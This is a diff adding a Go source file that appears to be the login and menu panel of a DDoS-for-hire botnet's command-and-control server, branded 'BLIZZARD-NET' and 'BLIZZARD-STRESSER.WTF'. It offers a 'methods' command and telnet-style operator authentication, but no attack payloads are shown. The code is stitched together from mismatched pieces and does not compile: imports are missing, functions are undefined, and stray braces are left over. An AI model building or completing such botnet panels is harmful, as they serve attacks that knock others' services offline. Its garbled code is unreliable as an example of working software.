@@ -1,0 +1,95 @@
+
+package main
+
+import (
+    "bufio"
+    "fmt"
+    "os"
+    "strings"
+)
+
+
+func main() {
+    reader := bufio.NewReader(os.Stdin)
+    showStartup()
+    for {
+        fmt.Print("\x1b[1;36muser\x1b[0;37m@\x1b[1;31mBLIZZARDNET\x1b[0;37m~# \033[0m")
+        cmd, _ := reader.ReadString('\n')
+        cmd = strings.TrimSpace(cmd)
+        switch strings.ToLower(cmd) {
+        case "clear", "cls", "c":
+            showStartup()
+        case "help", "?":
+            showHelp()
+        case "methods":
+            showMethods()
+        case "admin":
+            showAdmin()
+        case "credits":
+            showCredits()
+        case "exit", "quit":
+            return
+        case "":
+            continue
+        default:
+            fmt.Println("Unknown command. Type 'help' for available commands.")
+        }
+    }
+}
+
+func (this *Admin) Handle() {
+    this.conn.Write([]byte("\033[?1049h"))
+    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))
+
+    defer func() {
+        this.conn.Write([]byte("\033[?1049l"))
+    }()
+
+    // Get username
+    this.conn.Write([]byte("\033[2J\033[1;1H"))
+    this.conn.Write([]byte("\033[01;36mLOGIN\033[01;36m | BLIZZARD-NET\r\n"))
+    this.conn.Write([]byte("\r\n"))
+    this.conn.Write([]byte("\r\n"))
+    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
+    this.conn.Write([]byte("\033[0;96mUsername\033[37m: \033[0m"))
+    username, err := this.ReadLine(false)
+    if err != nil {
+        return
+    }
+
+    // Get password
+    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
+    this.conn.Write([]byte("\033[0;96mPassword\033[37m: \033[0m"))
+    password, err := this.ReadLine(true)
+    if err != nil {
+        return
+    }
+    //Attempt  Login
+    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
+    this.conn.Write([]byte("\r\n"))
+    spinBuf := []byte{'-', '\\', '|', '/'}
+    for i := 0; i < 15; i++ {
+        this.conn.Write(append([]byte("\r\033[01;36mChecking login.. \033[01;36mPlease wait \033[01;37m"), spinBuf[i % len(spinBuf)]))
+        time.Sleep(time.Duration(300) * time.Millisecond)
+    }
+    this.conn.Write([]byte("\r\n"))
+
+    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
+    this.conn.Write([]byte("\r\n"))
+
+    var loggedIn bool
+    var userInfo AccountInfo
+    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
+        this.conn.Write([]byte("\033[2J\033[1;1H"))
+        this.conn.Write([]byte("\r\033[91m[!] Invalid login!\r\n"))
+        this.conn.Write([]byte("\033[91mPress any key to exit\033[0m"))
+        buf := make([]byte, 1)
+        this.conn.Read(buf)
+        return
+    }
+    fmt.Print("\033[01;37m ╔-═════════════════════════════════-╗\r\n")
+    fmt.Print("\033[01;37m ║ \033[01;31mOwner: \033[01;37mBLIZZARD-STRESSER.WTF\t      \033[01;37m║\r\n")
+    fmt.Print("\033[01;37m ║ \033[01;31mDeveloper: \033[01;37mRootSec\t      \033[01;37m║\r\n")
+    fmt.Print("\033[01;37m ╚-═════════════════════════════════-╝  \r\n")
+}
+            }
